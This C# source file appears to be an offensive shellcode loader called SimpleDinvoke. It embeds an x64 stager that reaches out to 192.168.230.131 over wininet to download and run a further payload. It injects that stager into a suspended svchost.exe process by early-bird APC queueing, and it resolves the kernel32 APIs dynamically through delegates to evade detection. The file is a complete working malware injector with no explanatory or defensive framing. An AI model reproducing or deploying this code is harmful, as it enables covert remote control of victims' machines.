using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;

using static SimpleDinvoke.Types;
using static SimpleDinvoke.Helper;

namespace SimpleDinvoke
{
    class Program
    {
        static void Main(string[] args)
        {
            byte[] buf = new byte[767] {
0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x41,0x51,0x48,
0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,
0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x4d,
0x31,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,
0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
0xe8,0x10,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x32,0x33,
0x30,0x2e,0x31,0x33,0x31,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x01,
0x00,0x00,0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,
0xc6,0x00,0x00,0x00,0x00,0xff,0xd5,0xe8,0xd4,0x00,0x00,0x00,0x2f,0x71,0x72,
0x47,0x2d,0x70,0x38,0x6d,0x4e,0x53,0x79,0x42,0x71,0x79,0x6d,0x76,0x49,0x43,
0x78,0x67,0x62,0x4f,0x51,0x72,0x70,0x4d,0x5a,0x5a,0x62,0x68,0x44,0x2d,0x67,
0x62,0x56,0x66,0x30,0x71,0x68,0x46,0x79,0x56,0x44,0x70,0x57,0x79,0x45,0x77,
0x55,0x34,0x33,0x4c,0x31,0x53,0x39,0x76,0x52,0x71,0x79,0x71,0x4b,0x35,0x36,
0x31,0x65,0x57,0x63,0x4b,0x75,0x53,0x5a,0x31,0x31,0x32,0x41,0x62,0x47,0x71,
0x72,0x47,0x63,0x42,0x72,0x47,0x61,0x5a,0x77,0x67,0x30,0x44,0x63,0x43,0x62,
0x61,0x4b,0x36,0x46,0x48,0x4b,0x76,0x71,0x4e,0x78,0x6d,0x48,0x31,0x69,0x76,
0x5a,0x73,0x63,0x49,0x42,0x39,0x5f,0x74,0x46,0x4b,0x49,0x72,0x56,0x47,0x6c,
0x50,0x5a,0x37,0x53,0x78,0x58,0x5f,0x55,0x62,0x62,0x65,0x6c,0x68,0x72,0x55,
0x71,0x31,0x6b,0x5f,0x33,0x66,0x41,0x73,0x5a,0x66,0x6d,0x38,0x71,0x5f,0x69,
0x34,0x49,0x39,0x72,0x53,0x67,0x32,0x4c,0x66,0x50,0x33,0x4d,0x35,0x35,0x57,
0x63,0x64,0x67,0x64,0x73,0x67,0x4f,0x46,0x56,0x65,0x47,0x47,0x2d,0x6d,0x77,
0x46,0x59,0x59,0x6e,0x43,0x61,0x6a,0x48,0x36,0x4d,0x69,0x56,0x39,0x4c,0x6e,
0x4c,0x73,0x74,0x36,0x50,0x34,0x36,0x36,0x73,0x5f,0x43,0x68,0x4e,0x00,0x48,
0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,0xc9,0x53,0x48,0xb8,0x00,0x32,0xa8,
0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,
0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,
0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,0x6a,0x04,0x41,0x59,0x49,0xba,0x75,
0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,
0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,0x53,0x53,0x49,0xc7,0xc2,0x2d,0x06,
0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,0x48,0xc7,0xc1,0x88,0x13,0x00,0x00,
0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0xff,0xcf,
0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,0x00,0x53,0x59,0x6a,0x40,0x5a,0x49,
0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,0x00,0x10,0x00,0x00,0x49,0xba,0x58,
0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x93,0x53,0x53,0x48,0x89,
0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,0xc7,0xc0,0x00,0x20,0x00,0x00,0x49,
0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,0x00,0x00,0x00,0x00,0xff,0xd5,0x48,
0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,
0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,
0xff,0xd5 };

            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            IntPtr fPtr = GetLibaddr("kernel32.dll", "CreateProcessA");
            createproc cp = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(createproc)) as createproc;
            bool createprocstat = cp("C:\\Windows\\System32\\svchost.exe", null, IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
            Console.WriteLine("Error 1 : " + createprocstat);

            fPtr = GetLibaddr("kernel32.dll", "VirtualAllocEx");
            valloc virtalloc = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(valloc)) as valloc;
            IntPtr addr = virtalloc(pi.hProcess, IntPtr.Zero, (uint)buf.Length, (uint)(AllocationType.Commit | AllocationType.Reserve), (uint)MemoryProtection.ReadWrite);
            Console.WriteLine("Allocated addr : 0x{0:X}", addr.ToInt64());

            UIntPtr byteswritten = UIntPtr.Zero;
            fPtr = GetLibaddr("kernel32.dll", "WriteProcessMemory");
            writeprocmem wrpm = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(writeprocmem)) as writeprocmem;
            wrpm(pi.hProcess, addr, buf, (uint)buf.Length, out byteswritten);

            uint oldProtect = 0;
            fPtr = GetLibaddr("kernel32.dll", "VirtualProtectEx");
            vprotect vprot = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(vprotect)) as vprotect;
            vprot(pi.hProcess, addr, buf.Length, (uint)MemoryProtection.ExecuteRead, out oldProtect);

            fPtr = GetLibaddr("kernel32.dll", "QueueUserAPC");
            queueUseApc qapc = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(queueUseApc)) as queueUseApc;
            qapc(addr, pi.hThread, IntPtr.Zero);

            fPtr = GetLibaddr("kernel32.dll", "ResumeThread");
            resthread rt = Marshal.GetDelegateForFunctionPointer(fPtr, typeof(resthread)) as resthread;
            rt(pi.hThread);
        }
    }
}
